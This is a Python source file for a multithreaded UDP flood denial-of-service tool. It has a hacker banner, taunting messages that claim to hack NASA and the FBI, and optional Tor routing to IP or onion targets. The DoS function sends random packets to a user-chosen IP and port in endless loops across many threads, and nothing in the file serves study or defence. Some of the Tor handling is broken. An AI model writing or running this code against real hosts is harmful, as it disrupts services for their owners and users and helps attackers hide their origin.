import threading
import socket
import random
import sys
from torpy import TorClient

def random_phrase():
    people = ["Near Shelby", "Sasaki", "sysb1n", "Gr3n0xX", "Quiliarca", "Lucazz Dev", "vl0ne-$", "Xernoboy", "marreta cabeça de rato", "S4SUK3"]
    actions = ["was here", "is watching you", "knows your name", "knows your location", "hacked NASA", "hacked FBI", "hacked you", "is looking for you", "is right behind you", "has hype"]
    return random.choice(people) + " " + random.choice(actions)

def get_tor_session(ip, port):
    with TorClient() as tor:
        # Create Tor client
        with tor.create_circuit() as circuit:
            # Create circuit for socket
            return tor.create_stream((ip, port), await_circuit=circuit)

def route_to_target(ip, port):
    try:
        with get_tor_session(ip, port) as stream:
            response = stream.send(b"GET /")
            print(f"\033[1;34m[INFO] \033[0m\xBB Routed to IP: {ip}, Port: {port}")
            print(response.recv(1024).decode())
    except Exception as e:
        print(f"\n\033[1;31m[ERROR] \033[0m\xBB An error occurred while routing to IP and port: {e}")

def route_to_onion(onion_url):
    try:
        with TorClient() as tor:
            # Create Tor client
            with tor.create_circuit() as circuit:
                # Create circuit for socket
                with tor.create_stream((onion_url, 80), await_circuit=circuit) as stream:
                    response = stream.send(b"GET /")
                    print(f"\033[1;34m[INFO] \033[0m\xBB Routed to Onion address: {onion_url}")
                    print(response.recv(1024).decode())
    except Exception as e:
        print(f"\n\033[1;31m[ERROR] \033[0m\xBB An error occurred while routing to Onion address: {e}")

def banner():
    print(f"""\033[2;31m
     ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄      ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄
    █   █   █ █      █ █   █    ▐  █ ▐  ▄▀   ▐ █   █   █     █ ▄▀   █ █      █ █ █   ▐
    ▐  █▀▀▀▀  █      █ ▐  █        █   █▄▄▄▄▄  ▐  █▀▀█▀      ▐ █    █ █      █    ▀▄
       █      ▀▄    ▄▀   █   ▄    █    █    ▌   ▄▀    █        █    █ ▀▄    ▄▀ ▀▄   █
     ▄▀         ▀▀▀▀      ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄   █     █        ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀
    █                           ▀     █    ▐   ▐     ▐       █     ▐            ▐
    ▐                                 ▐                      ▐ {random_phrase()}

    \033[2;33mVersion: 1.3 \t Coded by Bello AbdulSamad \n\033[0m
    """)

def DoS(ip, port, size, index):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(random._urandom(size), (ip, port))
            print(f"\033[1;34m[THREAD {index}] \033[0m\xBB \033[1;35m{size}\033[0m bytes sent to \033[1;35m{ip}\033[0m")
        except Exception as e:
            print(f"\n\033[1;31m[ERROR] \033[0m\xBB An error occurred sending data in thread {index}: {e}")

def main():
    try:
        if sys.version_info[0] != 3:
            print("\033[1;31m[ERROR] \033[0m\xBB Please run the tool using Python 3")
            sys.exit()

        if len(sys.argv) < 5:
            banner()

        target = input("\033[1;34m[>] \033[2;32mEnter the target ip, onion address, or 'tor' to route through Tor \xBB \033[0m") if len(sys.argv) < 2 else sys.argv[1]
        PORT = int(input("\033[1;34m[>] \033[2;32mEnter the target port \xBB \033[0m")) if len(sys.argv) < 3 else int(sys.argv[2])
        SIZE = int(input("\033[1;34m[>] \033[2;32mEnter the packet size \xBB \033[0m")) if len(sys.argv) < 4 else int(sys.argv[3])
        COUNT = int(input("\033[1;34m[>] \033[2;32mEnter how many threads to use \xBB \033[0m")) if len(sys.argv) < 5 else int(sys.argv[4])

        if not (1 <= PORT <= 65535):
            raise ValueError("Please choose a port between 1 and 65535")

        if not (1 <= SIZE <= 65500):
            raise ValueError("Please choose a size between 1 and 65500")

        if target.lower() == 'tor':
            onion_url = input("\033[1;34m[>] \033[2;32mEnter the target onion address \xBB \033[0m")
            route_to_onion(onion_url)
            sys.exit()

        if ".onion" in target:
            onion_url = target
            route_to_onion(onion_url)
            sys.exit()

        route_to_target(target, PORT)

    except KeyboardInterrupt:
        print("\n\033[1;31m[!] \033[0mExiting...")
        sys.exit()

    except Exception as e:
        print(f"\n\033[1;31m[ERROR] \033[0m\xBB {e}")
        sys.exit()

    for i in range(COUNT):
        try:
            t = threading.Thread(target=DoS, args=(target, PORT, SIZE, i))
            t.start()
        except Exception as e:
            print(f"\n\033[1;31m[ERROR] \033[0m\xBB An error occurred initializing thread {i}: {e}")

if __name__ == "__main__":
    main()
